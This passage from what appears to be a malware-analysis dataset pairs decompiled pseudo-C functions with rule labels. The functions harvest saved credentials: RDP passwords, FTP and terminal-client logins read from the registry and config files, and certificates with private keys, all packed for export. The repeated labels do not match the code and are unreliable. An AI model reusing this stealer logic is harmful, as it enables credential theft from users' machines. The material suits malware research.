sub.kernel32.dll_lstrlenA(arg_8h, iVar1);\n                if (iVar1 != 0) {\n                    var_ch = fcn.004017a5(iVar1);\n                    fcn.004017dc(arg_8h, var_ch, iVar1);\n                }\n                break;\n            }\n        }\n    }\n    fcn.0040178e(pszFirst);\n    return var_ch;\n}\n",
        "token_count": 456
    },
    "0040cdbd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cdbd(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    uint16_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint16_t *puVar5;\n    uint16_t *puVar6;\n    uint var_2ch;\n    int32_t var_28h;\n    uint32_t var_24h;\n    uint16_t *var_20h;\n    int32_t var_1ch;\n    uint16_t *var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if (*0x412404 == NULL) {\n        return;\n    }\n    iVar3 = fcn.00401e0f(arg_ch, &var_10h);\n    if (iVar3 != 0) {\n        if (var_4h < 0x100000) {\n            iVar3 = fcn.004021bb(var_8h, var_4h);\n            if (iVar3 == 0) {\n                var_14h = fcn.0040cceb(\"username:s:\", var_8h, var_4h);\n                var_18h = fcn.0040cceb(\"password 51:b:\", var_8h, var_4h);\n                var_1ch = fcn.0040cceb(\"full address:s:\", var_8h, var_4h);\n                if (((var_14h != 0) && (var_18h != NULL)) && (var_1ch != 0)) {\n                    var_24h = sub.kernel32.dll_lstrlenA(var_18h);\n                    var_24h = var_24h >> 1;\n                    puVar5 = var_18h;\n                    puVar6 = var_18h;\n                    for (uVar4 = var_24h; uVar4 != 0; uVar4 = uVar4 - 1) {\n                        uVar2 = *puVar5;\n                        uVar1 = uVar2;\n                        if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n                            uVar2 = uVar2 & 0xff00 | uVar1 - 0x37;\n                        }\n                        else {\n                            uVar2 = uVar2 & 0xff00 | uVar1 - 0x30;\n                        }\n                        uVar1 = uVar2 >> 8;\n                        if ((uVar1 < 0x30) || (0x39 < uVar1)) {\n                            uVar2 = uVar2 & 0xff | uVar1 - 0x37 << 8;\n                        }\n                        else {\n                            uVar2 = uVar2 & 0xff | uVar1 - 0x30 << 8;\n                        }\n                        *puVar6 = uVar2 << 4 | uVar2 >> 8;\n                        puVar5 = puVar5 + 1;\n                        puVar6 = puVar6 + 1;\n                    }\n                    var_20h = var_18h;\n                    var_28h = 0;\n                    iVar3 = (**0x412404)(&var_24h, 0, 0, 0, 0, 1, &var_2ch);\n                    if ((iVar3 != 0) && (var_28h != 0)) {\n                        fcn.0040cba9(arg_8h, var_14h, var_1ch, var_28h, var_2ch);\n                        sub.kernel32.dll_LocalFree();\n                    }\n                }\n                fcn.0040178e(var_14h);\n                fcn.0040178e(var_18h);\n                fcn.0040178e(var_1ch);\n            }\n        }\n        fcn.00401ea4(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 866
    },
    "0040cf70": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cf70(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    char *pcVar3;\n    char *lpString;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x46, 0);\n    cVar1 = **0x412059;\n    lpString = *0x412059;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if (((iVar2 != 0) || (iVar2 = sub.shlwapi.dll_StrStrIA(),  iVar2 != 0)) &&\n           (iVar2 = fcn.0040223e(lpString),  iVar2 != 0)) {\n            hMem = arg_8h;\n            fcn.0040404c(arg_8h, iVar2, \"sites.xml\", 0xbeef0000);\n            fcn.0040178e(hMem);\n        }\n        iVar2 = -1;\n        pcVar3 = lpString;\n        do {\n            lpString = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            lpString = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = lpString;\n        } while (cVar1 != '\\0');\n        cVar1 = *lpString;\n    } while( true );\n}\n",
        "token_count": 360
    },
    "0040cff2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040cff2(uint arg_8h, uint hKey, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *hMem;\n    uint var_830h;\n    int32_t var_82ch;\n    int32_t var_828h;\n    uint var_824h;\n    uint var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    uint var_814h;\n    uint lpName;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_10h = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_10h, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            var_814h = fcn.00401c09(uVar2, &lpName);\n            fcn.0040178e(uVar2);\n            var_828h = fcn.00401b82(hKey, var_814h, 0x413fd4, &var_ch);\n            var_818h = fcn.00401b82(hKey, var_814h, \"ServerName\", 0);\n            var_81ch = fcn.00401b82(hKey, var_814h, 0x413fe8, 0);\n            hMem = fcn.00401b82(hKey, var_814h, 0x414000, &var_82ch);\n            if ((hMem == NULL) || (var_82ch != 4)) {\n                if (hMem != NULL) {\n                    fcn.0040178e(hMem);\n                }\n                var_820h = 0x15;\n            }\n            else {\n                var_820h = *hMem;\n                fcn.0040178e(hMem);\n            }\n            var_824h = fcn.00401b82(hKey, var_814h, \"InitialDirectory\", 0);\n            uVar2 = fcn.00401b82(hKey, var_814h, \"ServerType\", 0);\n            if (var_828h != 0) {\n                iVar1 = fcn.004040d7(var_828h, &var_ch, 0x414016);\n                if ((((iVar1 != 0) && (var_ch != 0)) && (var_81ch != 0)) && (var_818h != 0)) {\n                    fcn.00401522(arg_8h, 0xbeef0010);\n                    fcn.00401584(arg_8h, var_818h);\n                    fcn.00401584(arg_8h, var_81ch);\n                    fcn.00401558(arg_8h, var_828h, var_ch);\n                    fcn.00401522(arg_8h, var_820h);\n                    fcn.00401584(arg_8h, var_824h);\n                    fcn.00401584(arg_8h, uVar2);\n                }\n            }\n            fcn.0040178e(var_828h);\n            fcn.0040178e(var_818h);\n            fcn.0040178e(var_824h);\n            fcn.0040178e(var_81ch);\n            fcn.0040178e(uVar2);\n            fcn.0040cff2(arg_8h, hKey, var_814h);\n            fcn.0040178e(var_814h);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 903
    },
    "0040d24b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d24b(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *hMem;\n    int32_t arg_ch_00;\n    uint hMem_00;\n    uint ARG_0;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    hMem = fcn.00401b82(arg_ch, \"SOFTWARE\\\\Robo-FTP 3.7\\\\Scripts\", \"FTP Count\", &var_4h);\n    if (hMem != NULL) {\n        if (var_4h == 4) {\n            var_8h = *hMem;\n            if (500 < var_8h) {\n                var_8h = 500;\n            }\n            for (; var_8h != 0; var_8h = var_8h - 1) {\n                sub.user32.dll_wsprintfA(&ARG_0, \"FTP File%d\", var_8h);\n                arg_ch_00 = fcn.00401b82(arg_ch, \"SOFTWARE\\\\Robo-FTP 3.7\\\\Scripts\", &ARG_0, 0);\n                if (arg_ch_00 != 0) {\n                    hMem_00 = arg_8h;\n                    fcn.00403d67(arg_8h, arg_ch_00, 0xbeef0001);\n                    fcn.0040178e(hMem_00);\n                }\n            }\n        }\n        fcn.0040178e(hMem);\n    }\n    return;\n}\n",
        "token_count": 333
    },
    "0040d33e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d33e(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_4h = fcn.004015a9(arg_8h, 0x48, 0);\n    if ((((((*0x412408 != NULL) && (*0x41240c != NULL)) && (*0x412414 != NULL)) &&\n         ((*0x4123d0 != NULL && (*0x4123d4 != NULL)))) &&\n        ((*0x4123d8 != NULL && ((*0x4123dc != NULL && (*0x412410 != NULL)))))) &&\n       (var_8h = (**0x412408)(0, 0x41402e),  var_8h != 0)) {\n        iVar2 = 0;\n        while (iVar2 = (**0x41240c)(var_8h, iVar2),  iVar2 != 0) {\n            var_ch = *(*(iVar2 + 0xc) + 0x68);\n            puVar3 = *(*(iVar2 + 0xc) + 0x6c);\n            if (puVar3 != NULL) {\n                for (; var_ch != 0; var_ch = var_ch + -1) {\n                    iVar1 = sub.kernel32.dll_lstrcmpA(*puVar3, \"2.5.29.37\");\n                    if ((iVar1 == 0) && (puVar3[2] != 0)) {\n                        var_10h = fcn.004017a5(puVar3[2]);\n                        fcn.004017dc(puVar3[3], var_10h, puVar3[2]);\n                        iVar1 = sub.kernel32.dll_lstrcmpA(var_10h, 0x41403b);\n                        if ((iVar1 == 0) && (iVar1 = (**0x412414)(iVar2, 0, 0, &var_14h, &var_18h, 0),  iVar1 != 0)) {\n                            iVar1 = (**0x4123d0)(var_14h, var_18h, &var_1ch);\n                            if (iVar1 != 0) {\n                                iVar1 = (**0x4123d4)(var_1ch, 0, 7, 0, 0, &var_20h);\n                                if (iVar1 != 0) {\n                                    arg_ch = fcn.004017a5(var_20h);\n                                    iVar1 = (**0x4123d4)(var_1ch, 0, 7, 0, arg_ch, &var_20h);\n                                    if (iVar1 != 0) {\n                                        fcn.00401522(arg_8h, 0xbeef0000);\n                                        fcn.00401558(arg_8h, *(iVar2 + 4), *(iVar2 + 8));\n                                        fcn.00401558(arg_8h, arg_ch, var_20h);\n                                    }\n                                    fcn.0040178e(arg_ch);\n                                }\n                                (**0x4123d8)(var_1ch);\n                            }\n                            (**0x4123dc)(var_14h, 0);\n                        }\n                        fcn.0040178e(var_10h);\n                    }\n                    puVar3 = puVar3 + 4;\n                }\n            }\n        }\n        (**0x412410)(var_8h, 0);\n    }\n    fcn.004015ef(arg_8h, var_4h);\n    return;\n}\n",
        "token_count": 854
    },
    "0040d540": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d540(uint arg_8h, uint lpSubKey)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_ch;\n    uint lpString;\n    uint lpString_00;\n    uint lpString_01;\n    uint var_824h;\n    uint var_820h;\n    uint var_81ch;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(*0x4120d5, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            arg_ch = fcn.00401c09(uVar2, &lpName);\n            fcn.0040178e(uVar2);\n            uVar2 = fcn.00401b82(*0x4120d5, arg_ch, \"Host\", 0);\n            iVar1 = fcn.00401b82(*0x4120d5, arg_ch, \"User\", 0);\n            lpString = fcn.00401b82(*0x4120d5, arg_ch, \"Pass\", 0);\n            lpString_00 = fcn.00401b82(*0x4120d5, arg_ch, 0x414076, 0);\n            lpString_01 = fcn.00401b82(*0x4120d5, arg_ch, \"Remote Dir\", 0);\n            if (iVar1 != 0) {\n                fcn.00401522(arg_8h, 0xbeef0000);\n                fcn.00401584(arg_8h, uVar2);\n                fcn.00401584(arg_8h, iVar1);\n                fcn.00401584(arg_8h, lpString);\n                fcn.00401584(arg_8h, lpString_00);\n                fcn.00401584(arg_8h, lpString_01);\n            }\n            fcn.0040d540(arg_8h, arg_ch);\n            fcn.0040178e(arg_ch);\n            fcn.0040178e(uVar2);\n            fcn.0040178e(iVar1);\n            fcn.0040178e(lpString);\n            fcn.0040178e(lpString_00);\n            fcn.0040178e(lpString_01);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 675
    },
    "0040d7d4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d7d4(uint arg_8h, uint arg_ch)\n\n{\n    uchar uVar1;\n    uchar uVar2;\n    int32_t iVar3;\n    char *arg_ch_00;\n    int32_t iVar4;\n    uchar *puVar5;\n    int32_t iVar6;\n    uchar *puVar7;\n    char *arg_10h;\n    uint var_29h;\n    uint var_24h;\n    uint var_1dh;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar3 = fcn.00401d47(arg_ch);\n    if (iVar3 == 0) {\n        return;\n    }\n    iVar3 = fcn.00401e0f(arg_ch, &var_10h);\n    if (iVar3 != 0) {\n        arg_ch_00 = fcn.004017a5(var_4h);\n        fcn.004017dc(var_8h, arg_ch_00, var_4h);\n        arg_10h = arg_ch_00;\n        while ((*arg_10h != '\\0' && (iVar3 = sub.shlwapi.dll_StrStrA(arg_10h, \"<setting name=\\\"\"),  iVar3 != 0))) {\n            iVar4 = sub.kernel32.dll_lstrlenA(\"<setting name=\\\"\");\n            iVar3 = iVar3 + iVar4;\n            puVar5 = sub.shlwapi.dll_StrStrA(iVar3, 0x4140b3);\n            if (puVar5 == NULL) break;\n            uVar1 = *puVar5;\n            iVar4 = sub.shlwapi.dll_StrStrA(iVar3, \"value=\\\"\");\n            if (iVar4 == 0) break;\n            iVar6 = sub.kernel32.dll_lstrlenA(\"value=\\\"\");\n            arg_10h = iVar4 + iVar6;\n            puVar7 = sub.shlwapi.dll_StrStrA(arg_10h, 0x4140b3);\n            if (puVar7 == NULL) break;\n            uVar2 = *puVar7;\n            *puVar5 = 0;\n            *puVar7 = 0;\n            fcn.0040d747(arg_8h, iVar3, arg_10h);\n            *puVar5 = uVar1;\n            *puVar7 = uVar2;\n        }\n        fcn.0040178e(arg_ch_00);\n        fcn.00401ea4(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 568
    },
    "0040d97a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d97a(uint hKey, uint lpSubKey, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint lpString2;\n    uint arg_ch;\n    uint var_828h;\n    uint var_824h;\n    uint var_820h;\n    uint var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    int32_t var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            lpString2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            arg_ch = fcn.00401c09(lpString2, &lpName);\n            fcn.0040178e(lpString2);\n            var_810h = fcn.00401b82(hKey, arg_ch, \"HostName\", 0);\n            var_814h = fcn.00401b82(hKey, arg_ch, \"UserName\", 0);\n            var_818h = fcn.00401b82(hKey, arg_ch, \"Password\", 0);\n            var_81ch = fcn.00401b82(hKey, arg_ch, \"PortNumber\", &var_824h);\n            var_820h = fcn.00401b82(hKey, arg_ch, \"TerminalType\", 0);\n            if (((var_810h != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401522(arg_10h, 0xbeef0000);\n                fcn.00401584(arg_10h, var_810h);\n                fcn.00401584(arg_10h, var_814h);\n                fcn.00401584(arg_10h, var_818h);\n                fcn.00401558(arg_10h, var_81ch, var_824h);\n                fcn.00401584(arg_10h, var_820h);\n            }\n            fcn.0040d97a(hKey, arg_ch, arg_10h);\n            fcn.0040178e(arg_ch);\n            fcn.0040178e(var_810h);\n            fcn.0040178e(var_814h);\n            fcn.0040178e(var_818h);\n            fcn.0040178e(var_81ch);\n            fcn.0040178e(var_820h);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 690
    },
    "0040dbe2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dbe2(uint hKey, uint lpSubKey, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint lpString2;\n    int32_t var_830h;\n    uint var_82ch;\n    uint var_828h;\n    uint var_824h;\n    uint var_820h;\n    uint var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    int32_t var_810h;\n    uint lpName;\n    uint var_ch;\n    int32_t dwIndex;\n    uint phkResult;\n    \n    iVar1 = sub.advapi32.dll_RegOpenKeyA(hKey, lpSubKey, &phkResult);\n    if (iVar1 == 0) {\n        dwIndex = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = sub.advapi32.dll_RegEnumKeyExA(phkResult, dwIndex, &lpName, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            lpString2 = fcn.00401c09(lpSubKey, 0x4120b1);\n            var_828h = fcn.00401c09(lpString2, &lpName);\n            fcn.0040178e(lpString2);\n            var_810h = fcn.00401b82(hKey, var_828h, \"FTP destination server\", 0);\n            var_814h = fcn.00401b82(hKey, var_828h, \"FTP destination user\", 0);\n            var_818h = fcn.00401b82(hKey, var_828h, \"FTP destination password\", 0);\n            var_81ch = fcn.00401b82(hKey, var_828h, \"FTP destination port\", &var_824h);\n            var_820h = fcn.00401b82(hKey, var_828h, \"FTP destination catalog\", 0);\n            var_82ch = fcn.00401b82(hKey, var_828h, \"FTP profiles\", &var_830h);\n            if (((var_810h != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401522(arg_10h, 0xbeef0000);\n                fcn.00401584(arg_10h, var_810h);\n                fcn.00401584(arg_10h, var_814h);\n                fcn.00401584(arg_10h, var_818h);\n                fcn.00401558(arg_10h, var_81ch, var_824h);\n                fcn.00401584(arg_10h, var_820h);\n            }\n            if (var_830h != 0) {\n                fcn.00401522(arg_10h, 0xbeef0001);\n                fcn.00401558(arg_10h, var_82ch, var_830h);\n            }\n            fcn.0040dbe2(hKey, var_828h, arg_10h);\n            fcn.0040178e(var_828h);\n            fcn.0040178e(var_810h);\n            fcn.0040178e(var_814h);\n            fcn.0040178e(var_818h);\n            fcn.0040178e(var_81ch);\n            fcn.0040178e(var_820h);\n            fcn.0040178e(var_82ch);\n            dwIndex = dwIndex + 1;\n        }\n        sub.advapi32.dll_RegCloseKey(phkResult);\n    }\n    return;\n}\n",
        "token_count": 822
    },
    "0040de64": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040de64(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *lpString;\n    char *pcVar3;\n    char *pcVar4;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x4e, 0);\n    cVar1 = **0x41205d;\n    lpString = *0x412059;\n    pcVar4 = *0x41205d;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040223e(lpString);\n            hMem = arg_8h;\n            fcn.0040404c(arg_8h, arg_ch_00, \"ftpshell.fsi\", 0xbeef0000);\n            fcn.0040178e(hMem);\n        }\n        for (; *lpString != '\\0'; lpString = lpString + 1) {\n        }\n        lpString = lpString + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 401
    },
    "0040df51": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040df51(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *lpString;\n    char *pcVar3;\n    char *pcVar4;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x50, 0);\n    cVar1 = **0x41205d;\n    lpString = *0x412059;\n    pcVar4 = *0x41205d;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040223e(lpString);\n            hMem = arg_8h;\n            fcn.0040404c(arg_8h, arg_ch_00, \"ftpsite.ini\", 0xbeef0000);\n            fcn.0040178e(hMem);\n        }\n        for (; *lpString != '\\0'; lpString = lpString + 1) {\n        }\n        lpString = lpString + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 400
    },
    "0040dfcf": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dfcf(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint arg_ch_00;\n    char *lpString;\n    char *pcVar3;\n    char *pcVar4;\n    uint hMem;\n    uint var_4h;\n    \n    arg_ch = fcn.004015a9(arg_8h, 0x51, 0);\n    cVar1 = **0x41205d;\n    lpString = *0x412059;\n    pcVar4 = *0x41205d;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.004015ef(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = sub.shlwapi.dll_StrStrIA();\n        if (iVar2 != 0) {\n            arg_ch_00 = fcn.0040223e(lpString);\n            hMem = arg_8h;\n            fcn.0040404c(arg_8h, arg_ch_00, \"FTPList.db\", 0xbeef0000);\n            fcn.0040178e(hMem);\n        }\n        for (; *lpString != '\\0'; lpString = lpString + 1) {\n        }\n        lpString = lpString + 1;\n        iVar2 = -1;\n        pcVar3 = pcVar4;\n        do {\n            pcVar4 = pcVar3;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar3 + 1;\n            cVar1 = *pcVar3;\n            pcVar3 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 399
    },
    "0040e07e": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040e07e(uchar *arg_8h, uint arg_ch)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint32_t uVar5;\n    char *pcVar6;\n    ulong uVar7;\n    uint in_stack_ffffff64;\n    uchar *in_stack_ffffff68;\n    uint var_20h;\n    uint32_t var_1ch;\n    char *lpString;\n    char *var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar2 = fcn.00401d47(arg_ch);\n    if (iVar2 == 0) {\n        return;\n    }\n    iVar2 = fcn.00401e0f(arg_ch, &var_10h);\n    if (iVar2 != 0) {\n        var_14h = fcn.004017a5(var_4h);\n        fcn.004017dc(var_8h, var_14h, var_4h);\n        pcVar6 = var_14h;\n        while ((*pcVar6 != '\\0' && (iVar2 = sub.shlwapi.dll_StrStrA(pcVar6, \"winex=\\\"\"),  iVar2 != 0))) {\n            iVar3 = sub.kernel32.dll_lstrlenA(\"winex=\\\"\");\n            pcVar6 = iVar2 + iVar3;\n            lpString = pcVar6;\n            uVar7 = sub.shlwapi.dll_StrStrA(pcVar6, 0x4142e5);\n            puVar4 = uVar7;\n            if (puVar4 == NULL) break;\n            uVar1 = *puVar4;\n            *puVar4 = 0;\n            uVar5 = sub.kernel32.dll_lstrlenA(lpString, uVar7 >> 0x20 & 0xffffff00 | uVar1, puVar4);\n            if (uVar5 != 0) {\n                var_1ch = uVar5;\n                in_stack_ffffff64 = fcn.0040283f(lpString);\n                iVar2 = fcn.0040292f(in_stack_ffffff64, var_1ch);\n                if (iVar2 != 0) {\n                    var_1ch = var_1ch >> 1;\n                    iVar2 = fcn.004040d7(in_stack_ffffff64, &var_1ch, 0);\n                    if (iVar2 != 0) {\n                        fcn.00401522(arg_8h, 0xbeef0001);\n                        fcn.00401584(arg_8h, lpString);\n                        in_stack_ffffff68 = arg_8h;\n                        fcn.00401558(arg_8h, in_stack_ffffff64, var_1ch);\n                    }\n                }\n                fcn.0040178e(in_stack_ffffff64);\n            }\n            *in_stack_ffffff68 = in_stack_ffffff64;\n        }\n        fcn.00401522(arg_8h, 0xbeef0002);\n        fcn.00401558(arg_8h, var_14h, var_4h);\n        fcn.0040178e(var_14h);\n        fcn.00401ea4(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 731
    },
    "0040e1b7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
